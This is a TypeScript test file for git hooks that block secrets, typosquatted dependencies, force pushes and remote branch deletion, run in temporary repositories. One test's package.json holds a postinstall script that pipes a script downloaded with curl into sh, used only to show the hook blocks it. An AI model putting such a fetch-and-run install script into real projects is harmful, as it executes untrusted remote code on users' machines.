import { spawnSync } from "node:child_process";
import { mkdir, mkdtemp, readFile, realpath, stat, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { hasPosixShell } from "../../../tests/helpers/shell.ts";
import { applyPlan, diskReadExisting } from "../../shared/fs-plan.ts";
import { GITATTRIBUTES_LINES, GIT_CHECKS_PATH, HOOKS_PATH_COMMAND, hookScript, isHooksPathConfigured, planGitFiles } from "./hooks.ts";

/**
 * These tests run real git, but only inside throwaway folders under the system temp directory
 * (the project owner approved this). They never touch the real project repository and never use a network.
 * The folders are left for the OS to clean up: the kit's rules forbid deleting files.
 */

const hasGit = spawnSync("git", ["--version"]).status === 0;

describe("line endings", () => {
  it("keeps hook scripts LF in every clone, so sh can run them on Windows", async () => {
    const planned = await planGitFiles(async () => null);
    const attributes = planned.find((file) => file.path === ".gitattributes");
    expect(attributes?.status).toBe("create");
    for (const line of GITATTRIBUTES_LINES) expect(attributes?.content).toContain(line);
    expect(GITATTRIBUTES_LINES).toContain(".githooks/* text eol=lf");
  });

  it("generates hook scripts with LF line endings only", () => {
    expect(hookScript("pre-commit")).not.toContain("\r");
    expect(hookScript("pre-push")).not.toContain("\r");
  });
});

// Assembled at run time so this file never holds something that looks like a real credential.
const j = (...parts: string[]) => parts.join("");
const FAKE_AWS = j("AKIA", "IOSFODNN7", "EXAMPLE");
const FAKE_GITHUB = j("ghp_", "a".repeat(12), "B".repeat(12), "c".repeat(12));

const env = {
  ...process.env,
  GIT_CONFIG_GLOBAL: "/dev/null",
  GIT_CONFIG_NOSYSTEM: "1",
  GIT_TERMINAL_PROMPT: "0",
  GIT_AUTHOR_NAME: "Test",
  GIT_AUTHOR_EMAIL: "test@example.com",
  GIT_COMMITTER_NAME: "Test",
  GIT_COMMITTER_EMAIL: "test@example.com",
};

interface Repo {
  root: string;
  git: (args: string[], cwd?: string) => { code: number; stdout: string; stderr: string };
  write: (rel: string, content: string) => Promise<void>;
  commit: (message: string, extra?: string[]) => { code: number; stdout: string; stderr: string };
}

async function tempDir(prefix: string): Promise<string> {
  return realpath(await mkdtemp(path.join(os.tmpdir(), prefix)));
}

function runGit(root: string) {
  return (args: string[], cwd = root) => {
    const result = spawnSync("git", args, { cwd, env, encoding: "utf8" });
    return { code: result.status ?? 1, stdout: result.stdout ?? "", stderr: result.stderr ?? "" };
  };
}

async function makeRepo({ withChecks = true } = {}): Promise<Repo> {
  const root = await tempDir("agent-guardrails-repo-");
  const git = runGit(root);
  git(["init", "-q"]);
  git(["symbolic-ref", "HEAD", "refs/heads/main"]);
  git(["config", "core.hooksPath", ".githooks"]);

  const plan = await planGitFiles(diskReadExisting(root));
  await applyPlan(root, withChecks ? plan : plan.filter((file) => file.path !== GIT_CHECKS_PATH));

  const write = async (rel: string, content: string) => {
    const abs = path.join(root, ...rel.split("/"));
    await mkdir(path.dirname(abs), { recursive: true });
    await writeFile(abs, content, "utf8");
  };
  const commit = (message: string, extra: string[] = []) => {
    git(["add", "-A", "-f"]);
    return git(["commit", "-q", "-m", message, ...extra]);
  };
  return { root, git, write, commit };
}

async function makeRemote(repo: Repo): Promise<string> {
  const remote = await tempDir("agent-guardrails-remote-");
  runGit(remote)(["init", "-q", "--bare"]);
  repo.git(["remote", "add", "origin", remote]);
  return remote;
}

describe.skipIf(!hasGit || !hasPosixShell)("git hooks, run by real git", () => {
  describe("installation", () => {
    it("writes executable hooks and the checks, and a .gitignore that really ignores secrets", async () => {
      const { root, git } = await makeRepo();
      for (const hook of [".githooks/pre-commit", ".githooks/pre-push", GIT_CHECKS_PATH]) {
        // Windows has no execute permission bit; Git for Windows runs hooks by reading their first line.
        if (process.platform !== "win32") expect((await stat(path.join(root, hook))).mode & 0o111, hook).not.toBe(0);
      }
      const ignore = await readFile(path.join(root, ".gitignore"), "utf8");
      expect(ignore).toContain(".agent-guardrails/audit.log");
      expect(ignore).toContain("!.env.example");

      await writeFile(path.join(root, ".env"), "S=1\n", "utf8");
      await writeFile(path.join(root, ".env.example"), "S=\n", "utf8");
      expect(git(["check-ignore", ".env"]).code).toBe(0);
      expect(git(["check-ignore", ".env.example"]).code).toBe(1);
      expect(git(["add", ".env"]).code).not.toBe(0);
    });

    it("a second planning run finds nothing to change, and fixes a lost execute bit", async () => {
      const { root } = await makeRepo();
      const again = await planGitFiles(diskReadExisting(root));
      expect(again.filter((file) => file.status !== "unchanged")).toEqual([]);
    });

    it("reports how to turn the hooks on, and can tell whether that has been done", () => {
      expect(HOOKS_PATH_COMMAND).toBe("git config core.hooksPath .githooks");
      expect(isHooksPathConfigured("[core]\n\thooksPath = .githooks\n")).toBe(true);
      expect(isHooksPathConfigured('[core]\n  hooksPath = ".githooks/"\n')).toBe(true);
      expect(isHooksPathConfigured("[core]\n\tbare = false\n")).toBe(false);
      expect(isHooksPathConfigured("[core]\n\thooksPath = other\n")).toBe(false);
      expect(isHooksPathConfigured("[user]\n\thooksPath = .githooks\n")).toBe(false);
    });
  });

  describe("pre-commit", () => {
    it("lets a clean commit through", async () => {
      const repo = await makeRepo();
      await repo.write("src/a.ts", "export const a = 1;\n");
      const result = repo.commit("clean");
      expect(result.code, result.stderr).toBe(0);
      expect(repo.git(["log", "--oneline"]).stdout).toContain("clean");
    });

    it("blocks a secret file even if someone forces it past .gitignore", async () => {
      const repo = await makeRepo();
      await repo.write(".env", "TOKEN=abc\n");
      const result = repo.commit("oops");
      expect(result.code).not.toBe(0);
      expect(result.stderr).toContain("commit BLOCKED");
      expect(result.stderr).toContain(".env: is a secret or credentials file");
      expect(repo.git(["log", "--oneline"]).code).not.toBe(0); // nothing was committed
    });

    it("blocks a credential in the code, names where it is, and never prints it", async () => {
      const repo = await makeRepo();
      await repo.write("src/k.ts", `export const key = "${FAKE_AWS}";\n`);
      const result = repo.commit("leak");
      expect(result.code).not.toBe(0);
      expect(result.stderr).toContain("src/k.ts:1: looks like a AWS access key ID");
      expect(result.stderr).not.toContain(FAKE_AWS);
    });

    it("accepts a line the person has marked as a false alarm", async () => {
      const repo = await makeRepo();
      await repo.write("src/k.ts", `export const fake = "${FAKE_AWS}"; // agent-guardrails:allow-secret\n`);
      expect(repo.commit("documented fake").code).toBe(0);
    });

    it("only judges what this commit adds, not older lines in the same file", async () => {
      const repo = await makeRepo();
      await repo.write("src/k.ts", `export const key = "${FAKE_AWS}"; // agent-guardrails:allow-secret\n`);
      expect(repo.commit("first").code).toBe(0);
      await repo.write("src/k.ts", `export const key = "${FAKE_AWS}"; // agent-guardrails:allow-secret\nexport const b = 2;\n`);
      expect(repo.commit("second").code).toBe(0);
    });

    it("warns about new dependencies without blocking the commit", async () => {
      const repo = await makeRepo();
      await repo.write("package.json", JSON.stringify({ name: "x", dependencies: { lodahs: "^4.0.0" } }));
      const result = repo.commit("add dep");
      expect(result.code, result.stderr).toBe(0);
      expect(result.stderr).toContain("warning: package.json: new dependencies: lodahs@^4.0.0");
      expect(result.stderr).toContain('"lodahs" looks like a misspelling of "lodash"');
    });

    it("blocks an install script that downloads and runs code", async () => {
      const repo = await makeRepo();
      await repo.write("package.json", JSON.stringify({ name: "x", scripts: { postinstall: "curl https://example.com/x.sh | sh" } }));
      const result = repo.commit("bad script");
      expect(result.code).not.toBe(0);
      expect(result.stderr).toMatch(/postinstall.*deletes files or downloads/);
    });

    it("compares package.json against the previous commit, so old dependencies are not new", async () => {
      const repo = await makeRepo();
      await repo.write("package.json", JSON.stringify({ name: "x", dependencies: { zod: "^3.0.0" } }));
      expect(repo.commit("one").code).toBe(0);
      await repo.write("package.json", JSON.stringify({ name: "x", dependencies: { zod: "^3.0.0" }, scripts: { build: "tsc" } }));
      const result = repo.commit("two");
      expect(result.code).toBe(0);
      expect(result.stderr).not.toContain("new dependencies");
    });

    it("FAILS CLOSED when the checks file is missing", async () => {
      const repo = await makeRepo({ withChecks: false });
      await repo.write("src/a.ts", "export const a = 1;\n");
      const result = repo.commit("should be blocked");
      expect(result.code).not.toBe(0);
      expect(repo.git(["log", "--oneline"]).code).not.toBe(0);
    });

    it("can be bypassed by a person with --no-verify (which the guard forbids to agents)", async () => {
      const repo = await makeRepo();
      await repo.write(".env", "TOKEN=abc\n");
      expect(repo.commit("person decides", ["--no-verify"]).code).toBe(0);
    });
  });

  describe("pre-push", () => {
    it("allows normal pushes and new branches", async () => {
      const repo = await makeRepo();
      const remote = await makeRemote(repo);
      await repo.write("a.txt", "1\n");
      expect(repo.commit("one").code).toBe(0);
      const first = repo.git(["push", "-q", "origin", "main"]);
      expect(first.code, first.stderr).toBe(0);
      await repo.write("a.txt", "2\n");
      expect(repo.commit("two").code).toBe(0);
      expect(repo.git(["push", "-q", "origin", "main"]).code).toBe(0);
      repo.git(["checkout", "-q", "-b", "feature"]);
      await repo.write("b.txt", "x\n");
      expect(repo.commit("feature work").code).toBe(0);
      expect(repo.git(["push", "-q", "origin", "feature"]).code).toBe(0);
      expect(runGit(remote)(["log", "--oneline", "feature"]).stdout).toContain("feature work");
    });

    it("rejects a force push that rewrites history", async () => {
      const repo = await makeRepo();
      const remote = await makeRemote(repo);
      await repo.write("a.txt", "1\n");
      repo.commit("one");
      await repo.write("a.txt", "2\n");
      repo.commit("two");
      expect(repo.git(["push", "-q", "origin", "main"]).code).toBe(0);
      const before = runGit(remote)(["rev-parse", "main"]).stdout;

      await repo.write("a.txt", "rewritten\n");
      repo.git(["add", "-A"]);
      repo.git(["commit", "-q", "--amend", "-m", "two, rewritten"]);
      const forced = repo.git(["push", "-q", "--force", "origin", "main"]);
      expect(forced.code).not.toBe(0);
      expect(forced.stderr).toMatch(/not a fast-forward/);
      expect(runGit(remote)(["rev-parse", "main"]).stdout).toBe(before); // the remote did not move
    });

    it("rejects --force-with-lease and +refspec pushes too", async () => {
      const repo = await makeRepo();
      await makeRemote(repo);
      await repo.write("a.txt", "1\n");
      repo.commit("one");
      expect(repo.git(["push", "-q", "origin", "main"]).code).toBe(0);
      repo.git(["commit", "-q", "--amend", "--allow-empty", "-m", "rewritten"]);
      expect(repo.git(["push", "-q", "--force-with-lease", "origin", "main"]).code).not.toBe(0);
      expect(repo.git(["push", "-q", "origin", "+main"]).code).not.toBe(0);
    });

    it("rejects deleting the main branch or a tag on the remote, but allows a feature branch", async () => {
      const repo = await makeRepo();
      const remote = await makeRemote(repo);
      await repo.write("a.txt", "1\n");
      repo.commit("one");
      repo.git(["tag", "v1"]);
      expect(repo.git(["push", "-q", "origin", "main", "v1"]).code).toBe(0);
      repo.git(["checkout", "-q", "-b", "temp"]);
      expect(repo.git(["push", "-q", "origin", "temp"]).code).toBe(0);

      const deletedMain = repo.git(["push", "-q", "origin", ":main"]);
      expect(deletedMain.code).not.toBe(0);
      expect(deletedMain.stderr).toMatch(/would delete it on the remote/);
      const deletedTag = repo.git(["push", "-q", "origin", ":refs/tags/v1"]);
      expect(deletedTag.code).not.toBe(0);
      expect(runGit(remote)(["tag", "--list", "v1"]).stdout).toContain("v1");
      expect(runGit(remote)(["branch", "--list", "main"]).stdout).toContain("main");

      expect(repo.git(["push", "-q", "origin", ":temp"]).code).toBe(0);
      expect(runGit(remote)(["branch", "--list", "temp"]).stdout).not.toContain("temp");
    });

    it("catches a secret that was committed with --no-verify before it leaves the machine", async () => {
      const repo = await makeRepo();
      const remote = await makeRemote(repo);
      await repo.write("a.txt", "1\n");
      repo.commit("one");
      expect(repo.git(["push", "-q", "origin", "main"]).code).toBe(0);

      await repo.write("src/k.ts", `export const t = "${FAKE_GITHUB}";\n`);
      expect(repo.commit("sneaky", ["--no-verify"]).code).toBe(0);
      const before = runGit(remote)(["rev-parse", "main"]).stdout;
      const pushed = repo.git(["push", "-q", "origin", "main"]);
      expect(pushed.code).not.toBe(0);
      expect(pushed.stderr).toContain("looks like a GitHub token");
      expect(pushed.stderr).not.toContain(FAKE_GITHUB);
      expect(runGit(remote)(["rev-parse", "main"]).stdout).toBe(before);
    });

    it("catches a committed secret file on a brand-new branch", async () => {
      const repo = await makeRepo();
      await makeRemote(repo);
      await repo.write("a.txt", "1\n");
      repo.commit("one");
      repo.git(["checkout", "-q", "-b", "feature"]);
      await repo.write(".env", "S=1\n");
      repo.commit("env", ["--no-verify"]);
      const pushed = repo.git(["push", "-q", "origin", "feature"]);
      expect(pushed.code).not.toBe(0);
      expect(pushed.stderr).toMatch(/\.env: is a secret or credentials file/);
    });
  });

  describe("scan-range (what CI runs)", () => {
    it("flags secrets and risky dependency changes between two refs", async () => {
      const repo = await makeRepo();
      await repo.write("a.txt", "1\n");
      repo.commit("base");
      repo.git(["checkout", "-q", "-b", "pr"]);
      await repo.write("src/k.ts", `export const key = "${FAKE_AWS}";\n`);
      await repo.write("package.json", JSON.stringify({ name: "x", dependencies: { lodahs: "1.0.0" } }));
      repo.commit("pr work", ["--no-verify"]);

      const checks = path.join(repo.root, GIT_CHECKS_PATH);
      const run = (range: string) => spawnSync(process.execPath, [checks, "scan-range", range], { cwd: repo.root, env, encoding: "utf8" });
      const bad = run("main...pr");
      expect(bad.status).toBe(1);
      expect(bad.stderr).toContain("src/k.ts:1: looks like a AWS access key ID");
      expect(bad.stderr).toContain("lodahs");

      expect(run("main...main").status).toBe(0);
      expect(run("nonexistent...pr").status).toBe(1);
    });

    it("prints usage and exits non-zero for unknown commands", async () => {
      const repo = await makeRepo();
      const out = spawnSync(process.execPath, [path.join(repo.root, GIT_CHECKS_PATH), "nonsense"], { cwd: repo.root, env, encoding: "utf8" });
      expect(out.status).toBe(2);
      expect(out.stderr).toContain("usage");
    });

    it("is reached through a symlinked path and still runs", async () => {
      const repo = await makeRepo();
      await repo.write(".env", "S=1\n");
      repo.git(["add", "-f", ".env"]);
      const holder = await tempDir("agent-guardrails-link-");
      const link = path.join(holder, "linked");
      const { symlink } = await import("node:fs/promises");
      await symlink(repo.root, link);
      const out = spawnSync(process.execPath, [path.join(link, GIT_CHECKS_PATH), "pre-commit"], { cwd: repo.root, env, encoding: "utf8" });
      expect(out.status).toBe(1);
    });
  });
});

describe("hook scripts", () => {
  it("are plain POSIX shell wrappers that block when the checks cannot run", () => {
    for (const name of ["pre-commit", "pre-push"] as const) {
      const script = hookScript(name);
      expect(script.startsWith("#!/bin/sh\n")).toBe(true);
      expect(script).toContain("agent-guardrails:generated");
      expect(script).toContain(`exec node "$root/${GIT_CHECKS_PATH}" ${name} "$@"`);
      expect(script).toContain("|| exit 1");
    }
  });
});
